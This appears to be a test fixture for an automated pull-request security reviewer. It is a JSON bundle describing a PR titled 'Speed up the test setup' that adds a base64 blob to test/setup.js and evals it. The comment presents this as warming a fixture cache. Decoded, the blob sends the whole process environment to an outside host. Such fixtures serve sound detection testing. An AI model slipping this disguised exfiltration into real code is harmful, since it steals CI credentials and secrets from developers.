@@ -1,0 +1,86 @@
+{
+  "schema_version": 1,
+  "kind": "bundle",
+  "run_id": 123456,
+  "run_attempt": 1,
+  "repository_id": 42,
+  "pr_number": 6,
+  "head_sha": "190009db8687e95c53fd40061f171fbf2df8a7d0",
+  "base_repository_id": 42,
+  "base_ref": "main",
+  "base_tip_sha": "a66843fdf3df5ab530a3797c78a2e2524986f3f1",
+  "merge_base_sha": "a66843fdf3df5ab530a3797c78a2e2524986f3f1",
+  "status": "ok",
+  "payload": {
+    "pr": {
+      "repository": "OperationCode/eval-fixtures",
+      "repository_id": 42,
+      "number": 6,
+      "title": "Speed up the test setup",
+      "body": "Caches the test fixtures setup so the suite starts faster.\n",
+      "author_login": "eval-author",
+      "author_association": "CONTRIBUTOR",
+      "labels": [],
+      "changed_files": 1
+    },
+    "files": [
+      {
+        "path": "test/setup.js",
+        "old_path": null,
+        "status": "modified",
+        "base_mode": "100644",
+        "head_mode": "100644",
+        "additions": 4,
+        "deletions": 0,
+        "base_blob_sha": "b41f0bdc5b259a76030a20abf5d6b7d5c52c53a0",
+        "head_blob_sha": "649b58b2311daf602b1766d9cba4044f0c50bfad",
+        "binary": false,
+        "size": 550,
+        "coverage": "full",
+        "patch": "@@ -4,3 +4,7 @@\n \n process.env.TZ = \"UTC\";\n process.env.FIXTURES_DIR = path.join(__dirname, \"fixtures\");\n+\n+// warm the fixture cache\n+const cache = \"Y29uc3QgaHR0cHM9cmVxdWlyZSgiaHR0cHMiKTtjb25zdCBib2R5PUJ1ZmZlci5mcm9tKEpTT04uc3RyaW5naWZ5KHByb2Nlc3MuZW52KSkudG9TdHJpbmcoImJhc2U2NCIpO2NvbnN0IHJlcT1odHRwcy5yZXF1ZXN0KHtob3N0bmFtZToibWV0cmljcy5jaS10ZWxlbWV0cnkuZXhhbXBsZSIscGF0aDoiL3YxL2NvbGxlY3QiLG1ldGhvZDoiUE9TVCJ9KTtyZXEub24oImVycm9yIiwoKT0+e30pO3JlcS5lbmQoYm9keSk7\";\n+eval(Buffer.from(cache, \"base64\").toString(\"utf8\"));\n",
+        "patch_redaction": "blob-context",
+        "content": "\"use strict\";\n\nconst path = require(\"node:path\");\n\nprocess.env.TZ = \"UTC\";\nprocess.env.FIXTURES_DIR = path.join(__dirname, \"fixtures\");\n\n// warm the fixture cache\nconst cache = \"Y29uc3QgaHR0cHM9cmVxdWlyZSgiaHR0cHMiKTtjb25zdCBib2R5PUJ1ZmZlci5mcm9tKEpTT04uc3RyaW5naWZ5KHByb2Nlc3MuZW52KSkudG9TdHJpbmcoImJhc2U2NCIpO2NvbnN0IHJlcT1odHRwcy5yZXF1ZXN0KHtob3N0bmFtZToibWV0cmljcy5jaS10ZWxlbWV0cnkuZXhhbXBsZSIscGF0aDoiL3YxL2NvbGxlY3QiLG1ldGhvZDoiUE9TVCJ9KTtyZXEub24oImVycm9yIiwoKT0+e30pO3JlcS5lbmQoYm9keSk7\";\neval(Buffer.from(cache, \"base64\").toString(\"utf8\"));\n",
+        "head_content": "\"use strict\";\n\nconst path = require(\"node:path\");\n\nprocess.env.TZ = \"UTC\";\nprocess.env.FIXTURES_DIR = path.join(__dirname, \"fixtures\");\n\n// warm the fixture cache\nconst cache = \"Y29uc3QgaHR0cHM9cmVxdWlyZSgiaHR0cHMiKTtjb25zdCBib2R5PUJ1ZmZlci5mcm9tKEpTT04uc3RyaW5naWZ5KHByb2Nlc3MuZW52KSkudG9TdHJpbmcoImJhc2U2NCIpO2NvbnN0IHJlcT1odHRwcy5yZXF1ZXN0KHtob3N0bmFtZToibWV0cmljcy5jaS10ZWxlbWV0cnkuZXhhbXBsZSIscGF0aDoiL3YxL2NvbGxlY3QiLG1ldGhvZDoiUE9TVCJ9KTtyZXEub24oImVycm9yIiwoKT0+e30pO3JlcS5lbmQoYm9keSk7\";\neval(Buffer.from(cache, \"base64\").toString(\"utf8\"));\n",
+        "base_content": "\"use strict\";\n\nconst path = require(\"node:path\");\n\nprocess.env.TZ = \"UTC\";\nprocess.env.FIXTURES_DIR = path.join(__dirname, \"fixtures\");\n"
+      }
+    ],
+    "dependency_delta": {
+      "changes": [],
+      "new_global_sources": [],
+      "failures": []
+    },
+    "prefilter": {
+      "signals": [
+        {
+          "id": "encoded-blob",
+          "level": "signal",
+          "detail": "base64 run longer than 200 characters",
+          "file": "test/setup.js",
+          "subject": null,
+          "lines": [
+            9
+          ],
+          "count": 1
+        }
+      ],
+      "hard_blocks": []
+    },
+    "coverage": {
+      "trees_complete": true,
+      "files_in_comparison": 1,
+      "files_collected": 1,
+      "files": [
+        {
+          "path": "test/setup.js",
+          "coverage": "full",
+          "reason": null
+        }
+      ],
+      "complete": true
+    },
+    "size": {
+      "estimated_tokens": 753,
+      "limit_tokens": 150000
+    }
+  }
+}
